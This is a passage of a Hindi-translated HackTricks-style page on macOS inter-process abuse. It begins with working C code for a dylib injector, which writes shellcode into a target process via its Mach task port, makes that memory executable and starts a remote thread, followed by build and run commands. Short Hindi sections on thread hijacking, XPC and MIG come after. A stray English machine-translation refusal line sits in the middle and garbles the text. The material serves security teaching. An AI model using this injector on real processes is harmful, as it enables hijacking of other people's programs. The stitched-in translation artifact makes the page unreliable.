if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
Since there is no content provided from the hacking book to translate, I'm unable to proceed with the translation. Please provide the specific English text you want to be translated into Hindi, and I will translate it for you while maintaining the markdown and HTML syntax.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### थ्रेड हाइजैकिंग वाया टास्क पोर्ट <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

इस तकनीक में प्रक्रिया के एक थ्रेड को हाइजैक किया जाता है:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### मूल जानकारी

XPC, जिसका अर्थ है XNU (macOS द्वारा प्रयुक्त कर्नेल) इंटर-प्रोसेस कम्युनिकेशन, macOS और iOS पर **प्रक्रियाओं के बीच संचार** के लिए एक फ्रेमवर्क है। XPC एक तंत्र प्रदान करता है जो **सुरक्षित, असिंक्रोनस मेथड कॉल्स को विभिन्न प्रक्रियाओं के बीच** बनाने के लिए है। यह Apple की सुरक्षा पैराडाइम का एक हिस्सा है, जो **विशेषाधिकार-विभाजित अनुप्रयोगों के निर्माण** की अनुमति देता है जहां प्रत्येक **घटक** केवल उन अनुमतियों के साथ चलता है जो उसे अपना काम करने के लिए चाहिए, इस प्रकार से एक समझौता की गई प्रक्रिया से संभावित क्षति को सीमित करता है।

इस **संचार कार्य** के बारे में अधिक जानकारी के लिए और यह कैसे **कमजोर हो सकता है** देखें:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - मैक इंटरफेस जेनरेटर

MIG को **मैक IPC** कोड निर्माण की प्रक्रिया को **सरल बनाने** के लिए बनाया गया था। यह मूल रूप से **आवश्यक कोड उत्पन्न करता है** ताकि सर्वर और क्लाइंट एक दिए गए परिभाषा के साथ संवाद कर सकें। भले ही उत्पन्न कोड बदसूरत हो, एक डेवलपर को केवल इसे आयात करने की जरूरत होगी और उसका कोड पहले से कहीं अधिक सरल होगा।

अधिक जानकारी के लिए देखें:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## संदर्भ

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का पालन करें**.
* **HackTricks** को अपनी हैकिंग ट्रिक्स साझा करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करें।

</details>
